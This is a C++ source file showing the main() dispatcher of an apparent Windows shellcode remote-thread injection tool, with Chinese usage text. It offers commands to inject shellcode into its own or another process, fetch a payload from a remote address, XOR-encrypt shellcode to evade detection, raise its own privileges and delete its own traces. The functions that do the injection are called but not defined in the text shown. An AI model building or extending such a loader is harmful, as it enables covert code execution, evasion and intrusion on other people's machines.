#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <shlobj.h>
#include <tchar.h>
#include <WinInet.h>

#pragma comment(lib, "WinInet.lib")


int main(int argc, char* argv[])
{
    if (argc == 1)
    {
        fprintf(stderr,
            "  ____  _          _ _   ___        _           _   \n"
            "/ ___|| |__   ___| | | |_ _|_ __  (_) ___  ___| |_  \n"
            "\\___ \\| '_ \\ / _ \\ | |  | || '_ \\ | |/ _ \\/ __| __| \n"
            " ___) | | | |  __/ | |  | || | | || |  __/ (__| |_  \n"
            "|____/|_| |_|\\___|_|_| |___|_| |_|/ |\\___|\\___|\\__| \n"
            "                                |__/                \n"
            "\nUsage: ShellCode 远程线程注入器 \n\n"
            "Options: \n"
            "\t --show              显示当前所有可注入进程 \n"
            "\t --promote           尝试提升自身进程权限 \n"
            "\t --delself           从系统中删除自身痕迹 \n\n"
            
            " Format: \n"
            "\t --Format            将字节数组格式化为一行并打印 \n"
            "\t --FormatFile        将字节数组格式化并写出到文件 \n"
            "\t --Xor               将文本中压缩后的字节数组进行异或并输出 \n"
            "\t --Xchg              将压缩后的字符串转为字节数组格式 \n"
            "\t --XorArray          将字节数组加密/解密为字节数组格式 \n\n"
            
            " Inject: \n"
            "\t --InjectSelfShell   注入字符串到自身进程并运行 \n"
            "\t --InjectArrayByte   注入字节数组到自身进程并运行 \n"
            "\t --FileInjectShell   从文件中读入字符串并注入运行 \n"
            "\t --InjectProcShell   注入字符串到远程进程并运行 \n"
            "\t --InjectWebShell    从远程加载字符串并注入自身进程 \n\n"
            
            " Encode: \n"
            "\t --EncodeInFile      从文件读入加密字符串并执行反弹 \n"
            "\t --EncodePidInFile   注入加密后的字符串到远程进程中 \n\n"
            "Blog: \n"
            "\t https://lyshark.cnblogs.com \n\n"
        );
    }

    // 传递一个参数
    if (argc == 2)
    {
        // 输出当前进程列表
        // --show
        if (strcmp(argv[1], "--show") == 0)
        {
            EnumProcess();
        }
        // 提升自身权限
        if (strcmp(argv[1], "--promote") == 0)
        {
            bool flag = IncreaseSelfAuthority();
            if (flag == false)
            {
                printf("[-] 权限提升失败. \n");
            }
            else
            {
                printf("[*] 已提升. \n");
            }  
        }
        // 删除自身进程
        if (strcmp(argv[1], "--delself") == 0)
        {
            bool flag = SelfDel();
            if (flag == true)
            {
                printf("[*] 自身已清除. \n");
            }   
            else
            {
                printf("[-] 删除失败. \n");
            }
        }
    }
    // 传递三个参数
    if (argc == 4)
    {
        // 格式化为一行 Format --path d://shellcode.txt
        if ((strcmp(argv[1], "Format") == 0) && (strcmp(argv[2], "--path") == 0))
        {
            Compressed(argv[3]);
        }
        // 注入到自身进程并运行 InjectSelfShell --shellcode 0fce8bec8844abec....
        if ((strcmp(argv[1], "InjectSelfShell") == 0) && (strcmp(argv[2], "--shellcode") == 0))
        {
            InjectSelfCode(argv[3]);
        }
        // 直接注入文件中的字节数组 InjectArrayByte --path d://shellcode.txt
        if ((strcmp(argv[1], "InjectArrayByte") == 0) && (strcmp(argv[2], "--path") == 0))
        {
            CompressedOnFormat(argv[3]);
        }
        // 从文件中读入字符串并注入 FileInjectShell --path d://shellcode.txt
        if ((strcmp(argv[1], "FileInjectShell") == 0) && (strcmp(argv[2], "--path") == 0))
        {
            ReadShellCodeOnMemory(argv[3]);
        } 
    }
    // 传递五个参数
    if (argc == 6)
    {
        // 格式化保存为文件 FormatFile --path d://shellcode.txt --output d://encode.txt
        if ((strcmp(argv[1], "FormatFile") == 0) && (strcmp(argv[2], "--path") == 0) && (strcmp(argv[4], "--output") == 0))
        {
            CompressedToFile(argv[3], argv[5]);
        }
        // 异或加密/解密 Xor --path d://shellcode.txt --passwd lyshark
        if ((strcmp(argv[1], "Xor") == 0) && (strcmp(argv[2], "--path") == 0) && (strcmp(argv[4], "--passwd") == 0))
        {
            XorShellCode(argv[3], argv[5]);
        }
        // 字符串转字节数组 Xchg --input d://encode.txt --output d://array.txt
        if ((strcmp(argv[1], "Xchg") == 0) && (strcmp(argv[2], "--input") == 0) && (strcmp(argv[4], "--output") == 0))
        {
            XchgShellCode(argv[3], argv[5]);
        }
        // 字节数组加密为字节数组 XorArray --path d://array.txt --passwd lyshark
        if ((strcmp(argv[1], "XorArray") == 0) && (strcmp(argv[2], "--path") == 0) && (strcmp(argv[4], "--passwd") == 0))
        {
            XorEncodeDeCode(argv[3], argv[5]);
        }

        // 将字符串注入到远程进程 InjectProcShell --pid 1021 --shellcode 0fce8bec8844abec....
        if ((strcmp(argv[1], "InjectProcShell") == 0) && (strcmp(argv[2], "--pid") == 0) && (strcmp(argv[4], "--shellcode") == 0))
        {
            InjectCode(atoi(argv[3]), argv[5]);
        }
        // 从远程加载并注入字符串 InjectWebShell --address 192.168.1.1 --payload shellcode.raw
        if ((strcmp(argv[1], "InjectWebShell") == 0) && (strcmp(argv[2], "--address") == 0) && (strcmp(argv[4], "--payload") == 0))
        {
            WebPageBounceShellCode(argv[3], argv[5]);
        }
        // 加密反弹 EncodeInFile --path d://shellcode.txt --passwd lyshark
        if ((strcmp(argv[1], "EncodeInFile") == 0) && (strcmp(argv[2], "--path") == 0) && (strcmp(argv[4], "--passwd") == 0))
        {
            ReadXorShellCodeOnMemory(argv[3], argv[5]);
        }
    }

    // 传递七个参数
    if (argc == 8)
    {
        // 加密反弹 InjectXorCode --pid 1022 --path d://shellcode.txt --passwd lyshark
        if ((strcmp(argv[1], "EncodePidInFile") == 0) && (strcmp(argv[2], "--pid") == 0) && (strcmp(argv[4], "--path") == 0) && (strcmp(argv[6],"--passwd") == 0))
        {
            InjectXorCode(atoi(argv[3]), argv[5],argv[7]);
        }
    }
    return 0;
}
